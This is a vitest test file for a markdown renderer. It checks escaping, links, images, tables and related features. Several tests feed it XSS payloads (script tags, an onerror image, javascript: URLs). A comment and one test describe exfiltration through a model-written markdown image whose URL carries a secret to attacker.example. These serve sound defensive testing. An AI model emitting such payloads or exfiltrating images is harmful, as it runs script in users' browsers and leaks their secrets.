import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("renders raw HTML in the source as text, never as markup", () => {
    const html = renderMarkdown('<script>alert(1)</script>\n\nHi <img src=x onerror="alert(1)"> <b>bold</b>');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<b>");
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).toContain("&lt;b&gt;bold&lt;/b&gt;");
  });

  it("refuses script URLs in links and images", () => {
    const html = renderMarkdown("[a](javascript:alert(1)) [b](vbscript:x) ![c](javascript:alert(1)) [d](data:text/html,x)");
    expect(html).not.toMatch(/href="(javascript|vbscript|data):/i);
    expect(html).not.toContain("<img");
  });

  it("renders GFM tables with alignment, strikethrough and autolinks", () => {
    const html = renderMarkdown("| L | R |\n| :-- | --: |\n| a | 1 |\n\n~~gone~~ see https://dpf.example/x");
    expect(html).toMatch(/<table>[\s\S]*<th style="text-align:left">L<\/th>[\s\S]*<td style="text-align:right">1<\/td>/);
    expect(html).toContain("<s>gone</s>");
    expect(html).toContain('<a href="https://dpf.example/x">https://dpf.example/x</a>');
  });

  it("renders task-list items as disabled checkboxes", () => {
    const html = renderMarkdown("- [x] shipped\n- [ ] open\n- plain [ ] item");
    expect(html).toContain('<li class="task-list-item list-none"><input type="checkbox" disabled checked> shipped</li>');
    expect(html).toContain('<li class="task-list-item list-none"><input type="checkbox" disabled> open</li>');
    expect(html).toContain("<li>plain [ ] item</li>");
  });

  it("escapes code blocks and tags them with their language", () => {
    const html = renderMarkdown("```ts\nconst a = <T>(x: T) => x && 1;\n```\n\n    indented <b>");
    expect(html).toContain('<pre><code class="language-ts">const a = &lt;T&gt;(x: T) =&gt; x &amp;&amp; 1;\n</code></pre>');
    expect(html).toContain("<pre><code>indented &lt;b&gt;\n</code></pre>");
  });

  it("applies caller classes, a table wrapper and heading ids", () => {
    const html = renderMarkdown("## Hello *world*\n\npara `x`\n\n```\nblock\n```\n\n| a |\n| - |\n| b |", {
      classes: { h2: "h2c", p: "pc", code: "codec", pre: "prec", td: "tdc" },
      tableWrapperClass: "wrap",
      headingId: (text, level) => (level === 2 ? text.toLowerCase().replace(/\s+/g, "-") : undefined),
    });
    expect(html).toContain('<h2 class="h2c" id="hello-world">Hello <em>world</em></h2>');
    expect(html).toContain('<p class="pc">para <code class="codec">x</code></p>');
    expect(html).toContain('<pre class="prec"><code>block\n</code></pre>');
    expect(html).toMatch(/<div class="wrap">\n<table>[\s\S]*<td class="tdc">b<\/td>[\s\S]*<\/table>\n<\/div>/);
  });

  it("resolves links, marking external ones to open in a new tab", () => {
    const html = renderMarkdown("[in](./a.md) [out](https://x.example)", {
      resolveLink: (href) => (href.startsWith("http") ? { href, external: true } : { href: "/docs/a" }),
    });
    expect(html).toContain('<a href="/docs/a">in</a>');
    expect(html).toContain('<a href="https://x.example" target="_blank" rel="noopener noreferrer">out</a>');
  });

  it("opens absolute links in a new tab only when asked", () => {
    expect(renderMarkdown("[x](https://x.example)")).not.toContain("target=");
    expect(renderMarkdown("[x](https://x.example) [y](/y)", { externalLinksInNewTab: true })).toBe(
      '<p><a href="https://x.example" target="_blank" rel="noopener noreferrer">x</a> <a href="/y">y</a></p>\n',
    );
  });

  it("resolves images, and renders a refused image as its alt text", () => {
    const options = { resolveImage: (src: string) => (src.startsWith("/ok") ? `/cdn${src}` : null) };
    expect(renderMarkdown("![Kept](/ok.png)", options)).toContain('<img src="/cdn/ok.png" alt="Kept">');
    const dropped = renderMarkdown("![A <b> chart](https://x.example/c.png)", options);
    expect(dropped).toContain("[A &lt;b&gt; chart]");
    expect(dropped).not.toContain("x.example");
  });

  // BI-94E08D68 (EchoLeak class): an image renders the moment the HTML is
  // shown, so a model-written `![](https://host/?d=<secret>)` would send the
  // secret to that host with no click. With no resolveImage, only same-origin
  // and embedded images render; anything that leaves the origin is alt text.
  it("renders no off-origin image by default, so rendering cannot exfiltrate", () => {
    for (const src of [
      "https://attacker.example/p.png?d=secret",
      "http://attacker.example/p.png",
      "//attacker.example/p.png",
      "HTTPS://attacker.example/p.png",
      "/\\attacker.example/p.png",
    ]) {
      const html = renderMarkdown(`![leak](${src})`);
      expect(html).not.toContain("<img");
      expect(html).not.toContain("attacker.example");
      expect(html).toContain("[leak]");
    }
  });

  it("still renders same-origin and embedded images by default", () => {
    expect(renderMarkdown("![Chart](/api/docs-asset/c.png)")).toContain('<img src="/api/docs-asset/c.png" alt="Chart">');
    expect(renderMarkdown("![Rel](images/c.png)")).toContain('<img src="images/c.png" alt="Rel">');
    expect(renderMarkdown("![Dot](data:image/png;base64,iVBORw0KGgo=)")).toContain('src="data:image/png;base64,iVBORw0KGgo="');
  });

  it("lets the caller render a fence, and falls back to <pre> when it declines", () => {
    const html = renderMarkdown("```mermaid\ngraph TD\n```\n\n```js\nx\n```", {
      renderFence: (language) => (language === "mermaid" ? '<img alt="Diagram">\n' : null),
    });
    expect(html).toContain('<img alt="Diagram">');
    expect(html).not.toContain("graph TD");
    expect(html).toContain('<code class="language-js">x\n</code>');
  });

  it("links wikilinks only when a wikilink target is given", () => {
    expect(renderMarkdown("see [[a/b|Label]]")).toBe("<p>see [[a/b|Label]]</p>\n");
    const html = renderMarkdown("see [[a/b|Label]] and [[c]] but not `[[d]]`", {
      wikilinkHref: (slug) => `/wiki/${slug}`,
      resolveLink: () => ({ href: "/never" }),
    });
    expect(html).toBe('<p>see <a href="/wiki/a/b">Label</a> and <a href="/wiki/c">c</a> but not <code>[[d]]</code></p>\n');
  });

  it("keeps one caller's options out of the next render", () => {
    renderMarkdown("# a", { classes: { h1: "leaked" }, headingId: () => "leaked" });
    expect(renderMarkdown("# a")).toBe("<h1>a</h1>\n");
  });
});
